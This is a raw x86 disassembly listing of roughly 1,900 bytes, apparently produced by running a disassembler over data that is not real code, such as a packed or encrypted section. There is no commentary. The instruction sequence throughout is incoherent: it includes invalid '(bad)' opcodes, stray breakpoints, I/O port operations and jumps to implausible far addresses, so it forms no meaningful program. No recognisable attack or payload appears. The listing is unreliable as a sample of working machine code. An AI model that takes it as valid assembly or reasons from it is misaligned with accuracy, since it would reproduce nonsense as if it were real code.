  41ff53:	dec    ecx
  41ff54:	bound  edx,QWORD PTR [esi-0x3c]
  41ff57:	mov    edi,0xa930cdbb
  41ff5c:	int3   
  41ff5d:	mov    ch,0x2c
  41ff5f:	in     al,dx
  41ff60:	xchg   esi,eax
  41ff61:	shr    DWORD PTR [esi],cl
  41ff63:	xchg   ebx,eax
  41ff64:	lock ret 0xc6b5
  41ff68:	je     0x41ffde
  41ff6a:	stos   BYTE PTR es:[edi],al
  41ff6b:	jno    0x41ff14
  41ff6d:	cwde   
  41ff6e:	stos   BYTE PTR es:[edi],al
  41ff6f:	lock pop edi
  41ff71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff72:	shl    edi,cl
  41ff74:	cmp    bl,BYTE PTR [eax+0x2c2caa08]
  41ff7a:	and    DWORD PTR [esi+0x74b2dd7c],ecx
  41ff80:	mov    edi,0xd11d9374
  41ff85:	mov    ah,0xd8
  41ff87:	xchg   esi,eax
  41ff88:	and    BYTE PTR [ebx-0x16],cl
  41ff8b:	aam    0x8c
  41ff8d:	retf   
  41ff8e:	sbb    edx,edx
  41ff90:	jne    0x41ff40
  41ff92:	jns    0x41ffeb
  41ff94:	adc    eax,0x551916bf
  41ff99:	mov    ch,0xd
  41ff9b:	jmp    0x6b2b140e
  41ffa0:	pop    ebp
  41ffa1:	mov    esp,0x45d2905a
  41ffa6:	dec    ebx
  41ffa7:	xor    al,0x6a
  41ffa9:	je     0x41ff3e
  41ffab:	jmp    0x8132:0xee044d2e
  41ffb2:	jb     0x41ff5f
  41ffb4:	xchg   ebp,eax
  41ffb5:	test   al,0x6c
  41ffb7:	xchg   ecx,eax
  41ffb8:	inc    esi
  41ffb9:	lock pop ebp
  41ffbb:	ret    
  41ffbc:	sbb    BYTE PTR [ebp-0x34],bh
  41ffbf:	or     ebx,ebp
  41ffc1:	cdq    
  41ffc2:	pop    eax
  41ffc3:	sub    al,0xf0
  41ffc5:	pop    es
  41ffc6:	out    dx,al
  41ffc7:	scas   al,BYTE PTR es:[edi]
  41ffc8:	mov    al,dl
  41ffca:	adc    eax,0xa97207f
  41ffcf:	dec    ebp
  41ffd0:	pop    eax
  41ffd1:	fiadd  WORD PTR [ebx+0x6f]
  41ffd4:	shl    bh,1
  41ffd6:	push   ebx
  41ffd7:	outs   dx,BYTE PTR ds:[esi]
  41ffd8:	or     bh,BYTE PTR [edx+0x5b]
  41ffdb:	adc    bh,BYTE PTR [edx]
  41ffdd:	mov    eax,0x8e1c46ab
  41ffe2:	xchg   BYTE PTR [ebp-0x7],bh
  41ffe5:	xchg   edi,eax
  41ffe6:	add    ebp,DWORD PTR [ebx]
  41ffe8:	adc    al,0x65
  41ffea:	add    ah,bh
  41ffec:	mov    edi,0x768412b
  41fff1:	popa   
  41fff2:	or     bh,dl
  41fff4:	pop    ebx
  41fff5:	sub    edi,DWORD PTR [ecx+0x37]
  41fff8:	dec    ebp
  41fff9:	in     eax,0xf3
  41fffb:	out    0x72,al
  41fffd:	push   esp
  41fffe:	js     0x41ffc3
  420000:	clc    
  420001:	shl    DWORD PTR ds:0xde22b9d1,cl
  420007:	adc    esp,DWORD PTR [esi]
  420009:	loopne 0x41ffd2
  42000b:	mov    eax,0xc13396d3
  420010:	xor    eax,0x90f8c476
  420015:	sub    eax,0x5e1d0b96
  42001a:	mov    WORD PTR [eax+0x20],?
  42001d:	icebp  
  42001e:	sbb    BYTE PTR cs:[eax],ch
  420021:	rcr    DWORD PTR [edx-0x318eca80],cl
  420027:	out    dx,eax
  420028:	cmp    DWORD PTR [esi+0x49],esi
  42002b:	push   es
  42002c:	in     al,dx
  42002d:	pop    es
  42002e:	pop    edx
  42002f:	mov    ecx,0x25848088
  420034:	aam    0x40
  420036:	les    edi,FWORD PTR [edi]
  420038:	jg     0x420016
  42003a:	mov    bl,al
  42003c:	mov    al,ds:0xef2d14c4
  420041:	dec    ebp
  420042:	das    
  420043:	out    0xf7,eax
  420045:	iret   
  420046:	adc    cl,BYTE PTR [eax]
  420048:	rol    BYTE PTR [edi+0x39],cl
  42004b:	mov    ecx,0x39790428
  420050:	jp     0x420057
  420052:	outs   dx,BYTE PTR ds:[esi]
  420053:	ficomp DWORD PTR [eax+0x4a650e5a]
  420059:	pushf  
  42005a:	mov    ecx,0x868b804b
  42005f:	push   0xffffffd7
  420061:	adc    al,0xcc
  420063:	pop    ebp
  420064:	mov    cl,0xe2
  420066:	sbb    BYTE PTR [eax-0x3c2bc4e2],ch
  42006c:	aam    0xa9
  42006e:	or     BYTE PTR [ebp-0x50e2c683],al
  420074:	pop    ds
  420075:	dec    edx
  420076:	retw   0x53a9
  42007a:	into   
  42007b:	jge    0x420002
  42007d:	test   eax,0x77b0d894
  420082:	xor    esi,edi
  420084:	xchg   edx,eax
  420085:	dec    edx
  420086:	clc    
  420087:	test   eax,0x942898ec
  42008c:	pop    edi
  42008d:	cmp    eax,0x9db1db67
  420092:	xchg   BYTE PTR [esi],dh
  420094:	fld    DWORD PTR [esi]
  420096:	dec    ebp
  420097:	loope  0x4200e4
  420099:	inc    esi
  42009a:	sub    eax,0xbc4c2e7b
  42009f:	out    dx,al
  4200a0:	jle    0x420034
  4200a2:	stc    
  4200a3:	or     BYTE PTR [ebx-0x332c6eb9],bh
  4200a9:	adc    BYTE PTR [eax+0x2f4e021],bl
  4200af:	into   
  4200b0:	popa   
  4200b1:	mov    cl,ah
  4200b3:	push   ebp
  4200b4:	aas    
  4200b5:	and    al,BYTE PTR [edi]
  4200b7:	push   ecx
  4200b8:	add    eax,0x8e882fae
  4200bd:	cwde   
  4200be:	dec    edx
  4200bf:	push   cs
  4200c0:	aam    0xfa
  4200c2:	ror    di,cl
  4200c5:	sbb    esp,DWORD PTR [ebp+0x27]
  4200c8:	add    al,BYTE PTR [edi+0x2e840280]
  4200ce:	nop
  4200cf:	out    0x72,eax
  4200d1:	or     BYTE PTR [ecx-0x74ad0c89],bh
  4200d7:	mov    cl,0xaf
  4200d9:	mov    bl,0x32
  4200db:	push   esi
  4200dc:	or     ch,0x9e
  4200df:	dec    esp
  4200e0:	dec    ebp
  4200e1:	imul   ebx,DWORD PTR [eax-0x33],0x57
  4200e5:	repnz xchg edx,eax
  4200e7:	idiv   DWORD PTR [edi]
  4200e9:	mov    ecx,0xff47aa89
  4200ee:	loope  0x42013c
  4200f0:	(bad)  
  4200f2:	pop    ebx
  4200f3:	dec    esp
  4200f4:	int3   
  4200f5:	mov    eax,0xb9189d84
  4200fa:	or     al,0x88
  4200fc:	sti    
  4200fd:	loope  0x4200a3
  4200ff:	xchg   edx,eax
  420100:	div    BYTE PTR [edi+0x36]
  420103:	sar    DWORD PTR [esi+0x2a3080f3],cl
  420109:	imul   esi,DWORD PTR [ecx+0x54],0xffffffd2
  42010d:	retf   
  42010e:	leave  
  42010f:	repnz es clc 
  420112:	and    eax,0x724925f3
  420117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420118:	adc    al,0xd7
  42011a:	inc    eax
  42011b:	int3   
  42011c:	shl    BYTE PTR [ecx],cl
  42011e:	mov    edi,0xff47bce0
  420123:	jb     0x4200e4
  420125:	ss pop es
  420127:	cld    
  420128:	add    DWORD PTR [ebp+ecx*1+0x2a],esp
  42012c:	sti    
  42012d:	or     al,0x64
  42012f:	addr16 jno 0x42019b
  420132:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420133:	inc    ebx
  420134:	ins    DWORD PTR es:[edi],dx
  420135:	cli    
  420136:	push   eax
  420137:	shl    DWORD PTR [ebx-0x32e6b1df],0x39
  42013e:	leave  
  42013f:	mov    eax,0xf5ecf2a5
  420144:	das    
  420145:	ins    DWORD PTR es:[edi],dx
  420146:	mov    ds:0xbc15f154,eax
  42014b:	call   0x1fb1f825
  420150:	push   cs
  420151:	or     ecx,DWORD PTR [ebx+0x5]
  420154:	int3   
  420155:	mov    al,0xb1
  420157:	outs   dx,DWORD PTR ds:[esi]
  420158:	dec    eax
  420159:	inc    ecx
  42015a:	sbb    cl,bh
  42015c:	ins    DWORD PTR es:[edi],dx
  42015d:	xchg   ebx,edi
  42015f:	add    eax,0x2ff05d79
  420164:	(bad)  
  420165:	lods   eax,DWORD PTR ds:[esi]
  420166:	aaa    
  420167:	sbb    eax,0xcef49990
  42016c:	inc    ebp
  42016d:	call   0x4d8b:0xa8a8efcf
  420174:	mov    al,0xcd
  420176:	xchg   esi,eax
  420177:	mov    ecx,0x59b0e421
  42017c:	inc    ebp
  42017d:	sti    
  42017e:	pop    esi
  42017f:	cs jnp 0x4201a1
  420182:	data16 add BYTE PTR [eax],al
  420185:	add    BYTE PTR [eax],al
  420187:	add    BYTE PTR [eax],al
  420189:	add    BYTE PTR [ecx+0x57],bl
  42018c:	inc    ecx
  42018d:	dec    ebx
  42018e:	dec    edi
  42018f:	pop    edi
  420190:	pop    ebx
  420191:	push   edi
  420192:	sub    al,0x52
  420194:	xchg   DWORD PTR [ebx-0x40],esi
  420197:	mov    cl,0x22
  420199:	push   edi
  42019a:	(bad)  
  42019b:	nop
  42019c:	add    DWORD PTR [eax],eax
  42019e:	add    BYTE PTR [esi],0x0
  4201a1:	add    BYTE PTR [ecx],dh
  4201a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201a4:	bound  esi,QWORD PTR [ebx+0x9]
  4201a7:	(bad)  
  4201a8:	icebp  
  4201a9:	mov    ebx,0x74791072
  4201ae:	lea    ebp,[eax]
  4201b0:	mov    eax,ds:0x68de25a0
  4201b5:	fwait
  4201b6:	les    ecx,FWORD PTR [eax-0x1c]
  4201b9:	mov    cl,0x9d
  4201bb:	mov    ds,WORD PTR [edx+eiz*8-0x738d5e95]
  4201c2:	sub    DWORD PTR [edx+ecx*2],esi
  4201c5:	pop    es
  4201c6:	mov    dl,0x87
  4201c8:	ret    0xbf84
  4201cb:	scas   eax,DWORD PTR es:[edi]
  4201cc:	popa   
  4201cd:	in     al,dx
  4201ce:	fcom   QWORD PTR [edx-0xc]
  4201d1:	retf   0x1990
  4201d4:	sub    eax,edx
  4201d6:	not    DWORD PTR [ebp+eiz*1-0x3f]
  4201da:	add    ch,cl
  4201dc:	xor    ch,ch
  4201de:	pop    esi
  4201df:	push   0xb56dc555
  4201e4:	dec    ebp
  4201e5:	aad    0x63
  4201e7:	clc    
  4201e8:	dec    ebx
  4201e9:	xor    ch,BYTE PTR [ebx]
  4201eb:	or     BYTE PTR [edx-0x5f],0x1
  4201ef:	div    BYTE PTR [edx+0x152f6c0e]
  4201f5:	adc    al,0xff
  4201f7:	pop    ebp
  4201f8:	add    al,0x10
  4201fa:	fcomp  st(1)
  4201fc:	jge    0x4201eb
  4201fe:	or     eax,0x97c3016d
  420203:	js     0x42018e
  420205:	mov    ebx,0x61e29a4b
  42020a:	lock out dx,al
  42020c:	push   esi
  42020d:	pop    ecx
  42020e:	repz aaa 
  420210:	(bad)  
  420211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420212:	fidivr DWORD PTR [ebx-0x39]
  420215:	retf   
  420216:	mov    eax,0x325a7614
  42021b:	adc    al,0x36
  42021d:	rcl    dl,1
  42021f:	daa    
  420220:	and    BYTE PTR [ecx-0x72],bl
  420223:	cmp    esi,DWORD PTR [ecx]
  420225:	and    ecx,DWORD PTR [ebx+0x5c77de95]
  42022b:	mov    ah,al
  42022d:	push   esi
  42022e:	sbb    edx,DWORD PTR [ebp-0x78]
  420231:	(bad)  
  420232:	retf   
  420233:	pop    ecx
  420234:	pop    ebp
  420235:	ror    dl,cl
  420237:	in     al,0x99
  420239:	inc    esi
  42023a:	pop    ss
  42023b:	(bad)  
  42023c:	ins    BYTE PTR es:[edi],dx
  42023d:	test   DWORD PTR ds:0x27be34b5,edx
  420243:	test   al,0x46
  420245:	jecxz  0x4201d9
  420247:	xor    edx,DWORD PTR [edx+0x522d3ffc]
  42024d:	push   es
  42024e:	dec    DWORD PTR [eax]
  420250:	in     eax,dx
  420251:	inc    edx
  420252:	pusha  
  420253:	imul   edi,DWORD PTR [esi-0x1540c74c],0xc677e7a9
  42025d:	dec    esi
  42025e:	xchg   DWORD PTR [esp+ebp*2+0x64],esp
  420262:	mov    ds:0x14fad1a5,eax
  420267:	out    dx,eax
  420268:	adc    ebx,ebx
  42026a:	add    BYTE PTR [ebp+ecx*4-0x4d87a69e],dh
  420271:	push   0x71c2333f
  420276:	aam    0x4a
  420278:	mov    ch,0xbd
  42027a:	mov    esp,0x8b5e81a
  42027f:	and    BYTE PTR [ebx+ebp*1-0x513865bd],0x7d
  420287:	cmp    ch,ch
  420289:	ret    0xca6c
  42028c:	xchg   BYTE PTR [eax+0x4c],dh
  42028f:	mov    ebx,0x81bb391b
  420294:	pop    ebx
  420295:	xor    bl,BYTE PTR [esi+0xca0723f]
  42029b:	adc    cl,BYTE PTR [edx]
  42029d:	push   edx
  42029e:	loopne 0x4202fc
  4202a0:	mov    al,0x7
  4202a2:	sbb    dh,BYTE PTR [esi+0x0]
  4202a5:	jle    0x420326
  4202a7:	xor    DWORD PTR [ebp-0x2ded5839],eax
  4202ad:	jl     0x4202d0
  4202af:	(bad)  
  4202b1:	pop    ss
  4202b2:	push   ebp
  4202b3:	mov    ebx,0xd916dac4
  4202b8:	fsub   st(5),st
  4202ba:	sub    al,0xdf
  4202bc:	retf   
  4202bd:	ret    
  4202be:	mov    DWORD PTR [eax],ebx
  4202c0:	cmp    bh,ch
  4202c2:	xchg   esi,eax
  4202c3:	mov    esi,0x681bfa02
  4202c8:	test   eax,0xdd6b60d7
  4202cd:	test   al,0x58
  4202cf:	sub    dl,bl
  4202d1:	icebp  
  4202d2:	and    eax,0xee3b2dd3
  4202d7:	add    DWORD PTR [ecx+0x5c],esp
  4202da:	fcmovnbe st,st(3)
  4202dc:	pusha  
  4202dd:	inc    esi
  4202de:	cmp    BYTE PTR [esi-0x30],0x82
  4202e2:	leave  
  4202e3:	ins    BYTE PTR es:[edi],dx
  4202e4:	icebp  
  4202e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202e6:	fisub  DWORD PTR [eax]
  4202e8:	data16 jg 0x42029c
  4202eb:	pop    ds
  4202ec:	add    BYTE PTR [ebp-0x32],dh
  4202ef:	shr    ch,0x79
  4202f2:	dec    ebp
  4202f3:	dec    eax
  4202f4:	mov    esi,0xdf92138e
  4202f9:	test   DWORD PTR [ecx],esp
  4202fb:	mov    esp,0x2d76fb18
  420300:	out    0x83,al
  420302:	jmp    0x44ee77bf
  420307:	test   DWORD PTR [ecx+0x64],esi
  42030a:	mov    al,ds:0xde2a47e9
  42030f:	dec    ebp
  420310:	cmp    eax,0x66e2a56b
  420315:	(bad)  
  420316:	cmc    
  420317:	cwde   
  420318:	popf   
  420319:	push   esp
  42031a:	gs test eax,0x5a1ae3c6
  420320:	rol    DWORD PTR [ebp*8+0x185f3330],1
  420327:	jnp    0x420318
  420329:	mov    bl,0x38
  42032b:	test   al,0xa6
  42032d:	ss add al,0x72
  420330:	(bad)  
  420331:	retf   
  420332:	pop    ss
  420333:	je     0x4203ab
  420335:	cmp    ecx,DWORD PTR [esp+eax*2-0x39]
  420339:	mov    ch,0xf2
  42033b:	stos   BYTE PTR es:[edi],al
  42033c:	inc    eax
  42033d:	lods   eax,DWORD PTR ds:[esi]
  42033e:	imul   edi,DWORD PTR [esi+edi*8-0x29a04a9a],0xffffffb1
  420346:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420347:	shl    BYTE PTR [eax],cl
  420349:	push   eax
  42034a:	jno    0x420344
  42034c:	xor    DWORD PTR [ebx-0x73f3aa50],eax
  420352:	enter  0xa95b,0x47
  420356:	loopne 0x420367
  420358:	sub    dh,BYTE PTR [ecx+0x4e06541d]
  42035e:	cdq    
  42035f:	ror    DWORD PTR [esi],cl
  420361:	ror    esp,1
  420363:	test   ebp,edi
  420365:	sbb    BYTE PTR ds:0x6250fb9e,cl
  42036b:	adc    al,0x58
  42036d:	inc    edi
  42036e:	test   eax,0x3352083
  420373:	ret    0x7ad3
  420376:	lods   eax,DWORD PTR ds:[esi]
  420377:	adc    DWORD PTR ds:[ecx-0x501586d8],edi
  42037e:	es mov eax,0x754cf4a
  420384:	std    
  420385:	mov    dh,0xc7
  420387:	push   ecx
  420388:	push   esi
  420389:	mov    cl,0xe6
  42038b:	dec    edi
  42038c:	xchg   ecx,eax
  42038d:	mov    ds:0x97ec7c9,eax
  420392:	inc    edx
  420393:	jae    0x4203a7
  420395:	shl    DWORD PTR [edx+ecx*1],0xf2
  420399:	push   cs
  42039a:	call   0x1d93:0x6ddd3b7
  4203a1:	fwait
  4203a2:	jecxz  0x4203af
  4203a4:	lahf   
  4203a5:	popf   
  4203a6:	pushf  
  4203a7:	mov    edx,0xdc55a212
  4203ac:	lods   al,BYTE PTR ds:[esi]
  4203ad:	mov    ah,0xb7
  4203af:	add    DWORD PTR [ebx],eax
  4203b1:	js     0x4203da
  4203b3:	mov    ah,0x46
  4203b5:	jne    0x420354
  4203b7:	inc    edx
  4203b8:	mov    esp,0x312b2f18
  4203bd:	repz cmp BYTE PTR ss:0xaf170fa5,al
  4203c5:	fidivr WORD PTR [ebx-0x48]
  4203c8:	in     al,dx
  4203c9:	and    bl,BYTE PTR [edi-0x548b211b]
  4203cf:	sbb    ecx,eax
  4203d1:	sbb    BYTE PTR [edi],ah
  4203d3:	sub    eax,0x8c2b18a8
  4203d8:	(bad)  
  4203d9:	call   edx
  4203db:	lods   eax,DWORD PTR ds:[esi]
  4203dc:	dec    edi
  4203dd:	std    
  4203de:	iret   
  4203df:	cmp    BYTE PTR [ecx],bl
  4203e1:	pop    ss
  4203e2:	mov    ds:0x7fb9ea8d,eax
  4203e7:	outs   dx,DWORD PTR ds:[esi]
  4203e8:	fcmovb st,st(3)
  4203ea:	inc    esp
  4203eb:	inc    ebp
  4203ec:	pushf  
  4203ed:	inc    ebx
  4203ee:	and    eax,0x32e69384
  4203f3:	add    al,BYTE PTR [ebp+0x5c]
  4203f6:	lahf   
  4203f7:	dec    eax
  4203f8:	mov    dl,BYTE PTR [esi]
  4203fa:	add    al,0x8a
  4203fc:	les    eax,FWORD PTR [ebx+ebx*4-0x2b]
  420400:	pushf  
  420401:	cmp    bh,cl
  420403:	dec    esi
  420404:	mov    al,ds:0xefd4df64
  420409:	adc    eax,0xb7280511
  42040e:	dec    esi
  42040f:	or     DWORD PTR [eax+0x5d],0xf6e6987f
  420416:	out    0x20,al
  420418:	loop   0x420490
  42041a:	or     eax,0xdf99858d
  42041f:	add    dl,BYTE PTR [esi+0x12420595]
  420425:	popf   
  420426:	sub    BYTE PTR [bp+si+0x180d],bh
  42042b:	cwde   
  42042c:	push   es
  42042d:	jne    0x4203ea
  42042f:	adc    ch,BYTE PTR [eax]
  420431:	xor    ebx,DWORD PTR ds:0xf220ddc1
  420437:	adc    edx,0xffffffda
  42043a:	ret    
  42043b:	gs dec eax
  42043d:	test   DWORD PTR [eax+edx*1+0x1],ebx
  420441:	jno    0x4204be
  420443:	fsubr  DWORD PTR [edx]
  420445:	nop
  420446:	push   0x5076d7e2
  42044b:	jae    0x420400
  42044d:	xchg   esp,ebx
  42044f:	retf   0x6e4c
  420452:	pop    eax
  420453:	lock retf 
  420455:	cwde   
  420456:	push   0x10125b71
  42045b:	mov    bh,0xa5
  42045d:	mov    ds:0x24b914b5,al
  420462:	inc    DWORD PTR [edi+0x51]
  420465:	cmp    eax,0xe1356320
  42046a:	dec    ecx
  42046b:	add    al,0x5
  42046d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42046e:	mov    al,0xa4
  420470:	add    eax,0x201fbf45
  420475:	inc    esp
  420476:	mov    edi,0xd54cbc70
  42047b:	push   es
  42047c:	jg     0x4204ab
  42047e:	xchg   edi,eax
  42047f:	ja     0x4204e2
  420481:	mov    BYTE PTR [edi],ah
  420483:	mov    al,ds:0x79debbf1
  420488:	cmp    DWORD PTR [edx-0x59],esp
  42048b:	(bad)  
  42048c:	jecxz  0x4204e6
  42048e:	jmp    0x8e326908
  420493:	adc    al,0xf0
  420495:	inc    ecx
  420496:	mov    al,ds:0x1162b670
  42049b:	xor    BYTE PTR ds:0x9f30ae14,0xe6
  4204a2:	xchg   esi,eax
  4204a3:	push   edx
  4204a4:	xchg   esi,eax
  4204a5:	or     BYTE PTR [esi+esi*8-0x7c],0x42
  4204aa:	fcmovbe st,st(7)
  4204ac:	mov    ebx,0x106f36a2
  4204b1:	(bad)  
  4204b2:	leave  
  4204b3:	repz aas 
  4204b5:	cmp    BYTE PTR [eax+0x2732fefa],0x3f
  4204bc:	mov    ebp,0xad671e84
  4204c1:	adc    esi,DWORD PTR [eax+edx*2]
  4204c4:	sub    al,0x65
  4204c6:	les    esi,FWORD PTR [edi]
  4204c8:	inc    esi
  4204c9:	mov    bl,0xc2
  4204cb:	xchg   DWORD PTR [edi+0x6b],eax
  4204ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204cf:	jg     0x4204f4
  4204d1:	loope  0x4204f6
  4204d3:	vpmacssdql ymm2,ymm0,ymm1,YMMWORD PTR [ecx+edx*2-0x1ceed8d1]
  4204de:	xchg   esp,eax
  4204df:	pop    DWORD PTR [ecx+0x53]
  4204e2:	ja     0x4204c1
  4204e4:	mov    al,0xad
  4204e6:	sti    
  4204e7:	dec    edi
  4204e8:	aas    
  4204e9:	pop    ecx
  4204ea:	popf   
  4204eb:	rcr    ecx,cl
  4204ed:	fwait
  4204ee:	inc    edx
  4204ef:	lods   al,BYTE PTR ds:[si]
  4204f1:	inc    edx
  4204f2:	icebp  
  4204f3:	std    
  4204f4:	pop    esp
  4204f5:	in     eax,dx
  4204f6:	dec    edx
  4204f7:	xchg   ecx,eax
  4204f8:	pop    edx
  4204f9:	(bad)  
  4204fa:	retf   
  4204fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204fc:	add    al,0xdb
  4204fe:	scas   eax,DWORD PTR es:[edi]
  4204ff:	shr    BYTE PTR [ebp+0x73],cl
  420502:	xor    BYTE PTR [esi-0x43],0x68
  420506:	pushf  
  420507:	sub    esi,DWORD PTR [esi+0x4d]
  42050a:	inc    ebx
  42050b:	stos   BYTE PTR es:[edi],al
  42050c:	icebp  
  42050d:	ss jecxz 0x4204ca
  420510:	test   BYTE PTR [esi],0xae
  420513:	add    DWORD PTR [edi+0x27a57509],esi
  420519:	ins    DWORD PTR es:[edi],dx
  42051a:	and    DWORD PTR [eax+0x70a8b2c3],edx
  420520:	loop   0x4204df
  420522:	mov    cl,0xed
  420524:	outs   dx,BYTE PTR ds:[esi]
  420525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420526:	add    al,0x36
  420528:	fisubr DWORD PTR [ebx]
  42052a:	jmp    0x4204b6
  42052c:	push   esi
  42052d:	push   esp
  42052e:	js     0x4204bd
  420530:	iret   
  420531:	sub    DWORD PTR [ecx+eax*2],ebx
  420534:	cld    
  420535:	pop    eax
  420536:	and    eax,0x656900db
  42053b:	bound  ebp,QWORD PTR [esi+0x22]
  42053e:	jge    0x420539
  420540:	ins    BYTE PTR es:[edi],dx
  420541:	xchg   esp,eax
  420542:	mov    esi,0xe3cdfa4a
  420547:	mov    cl,0xce
  420549:	xor    esp,DWORD PTR [ecx-0x3a83f712]
  42054f:	scas   eax,DWORD PTR es:[edi]
  420550:	jle    0x4205b3
  420552:	adc    dl,BYTE PTR [ecx+0x54]
  420555:	jae    0x4204f2
  420557:	cdq    
  420558:	aad    0xa3
  42055a:	cmovb  ecx,DWORD PTR [eax-0x362c9c40]
  420561:	pop    es
  420562:	repnz sub al,0x8
  420565:	dec    ebx
  420566:	push   ecx
  420567:	mov    ds:0xeb6d1140,al
  42056c:	inc    eax
  42056d:	mov    ds:0xf3c1db1b,al
  420572:	sbb    DWORD PTR fs:0xbad0deb1,ecx
  420579:	cmc    
  42057a:	push   esp
  42057b:	cmp    eax,0x48d17348
  420580:	out    dx,eax
  420581:	mov    ebp,0x24375ea9
  420586:	and    DWORD PTR [eax-0x43630c57],eax
  42058c:	cmp    ebx,esi
  42058e:	rol    BYTE PTR [ebx+edi*2],cl
  420591:	adc    bh,bl
  420593:	mov    ah,0x88
  420595:	cwde   
  420596:	dec    ecx
  420597:	scas   eax,DWORD PTR es:[edi]
  420598:	mov    eax,ds:0x9e08312f
  42059d:	sub    BYTE PTR [edi],bl
  42059f:	mov    cl,0x9d
  4205a1:	xlat   BYTE PTR ds:[ebx]
  4205a2:	sub    DWORD PTR [edx-0x1e15a83e],edi
  4205a8:	mov    WORD PTR [ebx-0x49],ds
  4205ab:	push   eax
  4205ac:	inc    edi
  4205ad:	inc    ecx
  4205ae:	mov    cl,0xa
  4205b0:	mov    ecx,0x2416bd4c
  4205b6:	int3   
  4205b7:	lock (bad) 
  4205b9:	jmp    0x67fffcf5
  4205be:	jecxz  0x4205f8
  4205c0:	mov    ds:0xa55c25de,al
  4205c5:	sbb    al,0x77
  4205c7:	mov    ch,0xf9
  4205c9:	cmp    ecx,edx
  4205cb:	xor    bh,BYTE PTR [eax-0x145a4536]
  4205d1:	xchg   ebx,eax
  4205d2:	pushf  
  4205d3:	(bad)  
  4205d5:	mov    esp,0xccb88adc
  4205da:	fmul   DWORD PTR [eax-0x4f]
  4205dd:	cmp    bl,bl
  4205df:	inc    edx
  4205e0:	xchg   ebx,eax
  4205e1:	xor    BYTE PTR [eax+edx*8],ch
  4205e4:	jmp    0x420600
  4205e6:	fld    DWORD PTR [esi-0x569e4eb8]
  4205ec:	xchg   ecx,eax
  4205ed:	xchg   BYTE PTR [eax+0x5fa333d8],dh
  4205f3:	add    al,0x9e
  4205f5:	mov    dl,0x5e
  4205f7:	mov    ds:0x16fe8f1b,al
  4205fc:	xchg   BYTE PTR [ebp-0x54],bl
  4205ff:	push   edx
  420600:	sbb    BYTE PTR [ecx],dh
  420602:	mov    edx,0x8a5de18c
  420607:	push   0xc616f649
  42060c:	adc    BYTE PTR [edi+esi*4],ch
  42060f:	stc    
  420610:	mov    ebp,0x41c34e62
  420615:	xchg   ecx,eax
  420616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420617:	sub    DWORD PTR [ecx-0x61266749],ebx
  42061d:	sub    eax,0xa9f2f19c
  420622:	js     0x420625
  420624:	mov    esi,0x3343b710
  420629:	out    dx,al
  42062a:	push   edx
  42062b:	les    edi,FWORD PTR [eax]
  42062d:	lea    esp,[eax]
  42062f:	inc    edx
  420630:	xchg   dl,ch
  420632:	xor    eax,0xb3337169
  420637:	retf   0xdbe7
  42063a:	bound  edx,QWORD PTR [edx-0x6dd6167c]
  420640:	xchg   DWORD PTR [ebp+0x9],eax
  420643:	cmp    ah,BYTE PTR [esi+0x6e43078c]
  420649:	jecxz  0x42063b
  42064b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42064c:	add    eax,0xadf29a23
  420651:	mov    bl,0x2
  420653:	pop    es
  420654:	sbb    al,0x4d
  420656:	push   esp
  420657:	sub    al,0x5a
  420659:	jecxz  0x4206a3
  42065b:	inc    edi
  42065c:	and    eax,0x85595a8c
  420661:	aas    
  420662:	mov    ch,BYTE PTR [ebp-0x41]
  420665:	adc    eax,0xff8b7cdc
  42066a:	add    ebx,esi
  42066c:	dec    eax
  42066d:	push   esp
  42066e:	rcl    esp,cl
  420670:	add    al,0xf6
  420672:	xchg   edi,eax
  420673:	push   ecx
  420674:	mov    ecx,0xb3e7289e
  420679:	xor    bh,BYTE PTR ds:0x9889088a
  42067f:	jmp    0x4206a1
  420681:	push   edx
  420682:	cmp    BYTE PTR [ebx],ah
  420684:	lock xor al,0xed
  420687:	retf   0xcf5c
  42068a:	in     al,0x2c
  42068c:	pop    ebx
  42068d:	or     al,0xe5
  42068f:	cmp    esp,DWORD PTR [eax]
  420691:	mov    ecx,0xcea8162e
  420696:	dec    eax
  420697:	ds pop esi
  420699:	pusha  
  42069a:	lods   al,BYTE PTR ds:[esi]
  42069b:	(bad)  
  42069c:	call   0x3b0720fb
  4206a1:	xor    edi,esp
  4206a3:	jne    0x4206d9
  4206a5:	cld    
  4206a6:	mov    fs,WORD PTR ds:0x96da3a2a
  4206ac:	aam    0xc5
  4206ae:	dec    esp
  4206af:	aaa    
  4206b0:	push   ebp
  4206b1:	pop    ebp
  4206b2:	adc    bh,al
  4206b4:	iret   
  4206b5:	and    DWORD PTR [ebp+0x591907d2],ebx
  4206bb:	cmc    
  4206bc:	(bad)  
  4206bd:	add    BYTE PTR [edi+0x66],dh
  4206c0:	mov    WORD PTR [ecx],es
  4206c2:	fwait
  4206c3:	push   esi
  4206c4:	cmp    DWORD PTR [esi+edx*1],eax
  4206c7:	or     eax,0xad4404d2
  4206cc:	aam    0x18
  4206ce:	pop    edx
  4206cf:	adc    ebp,0xccaf79f5
  4206d5:	mov    edi,0xecb8b22e
  4206da:	or     ecx,edx
  4206dc:	sbb    DWORD PTR [eax-0x7d],esi
  4206df:	adc    DWORD PTR [ebp-0x7b6126c4],esp
  4206e5:	dec    edi
  4206e6:	scas   al,BYTE PTR es:[edi]
  4206e7:	jno    0x420748
  4206e9:	sub    BYTE PTR gs:[ecx-0x7c],dh
  4206ed:	push   ss
  4206ee:	popa   
  4206ef:	test   al,0x53
  4206f1:	add    eax,0x714622bf
  4206f6:	test   al,0x23
  4206f8:	pop    ecx
  4206f9:	sub    bh,BYTE PTR [ebx+ebp*2+0x9574594]
  420700:	data16 jno 0x420768
  420703:	dec    ebp
  420704:	pop    esp
  420705:	mov    ah,0xf1
  420707:	and    edi,DWORD PTR [ebx+ecx*1+0x1]
  42070b:	fld    DWORD PTR [esi-0x79c773b3]
  420711:	xlat   BYTE PTR ds:[ebx]
